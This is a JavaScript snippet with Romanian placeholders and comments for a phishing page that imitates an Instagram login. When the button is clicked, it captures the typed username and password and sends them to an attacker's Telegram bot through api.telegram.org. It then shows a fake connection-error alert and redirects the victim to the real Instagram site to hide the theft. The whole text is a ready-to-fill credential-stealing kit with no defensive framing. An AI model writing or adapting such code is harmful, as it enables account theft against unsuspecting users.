<script>
const token = 'AICI_PUI_TOKEN_DE_LA_BOTFATHER';
const chatId = 'AICI_PUI_ID_UL_TAU_CHAT';

document.querySelector('button').addEventListener('click', () => {
    const user = document.querySelector('input[type="text"]').value;
    const pass = document.querySelector('input[type="password"]').value;
    const mesaj = `🔔 Date noi primite:\n👤 User: ${user}\n🔑 Parola: ${pass}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}`)
    .then(() => {
        alert('Eroare de conexiune. Încearcă din nou.');
        window.location.href = "https://instagram.com"; // Îi trimite pe site-ul real după
    });
});
</script>
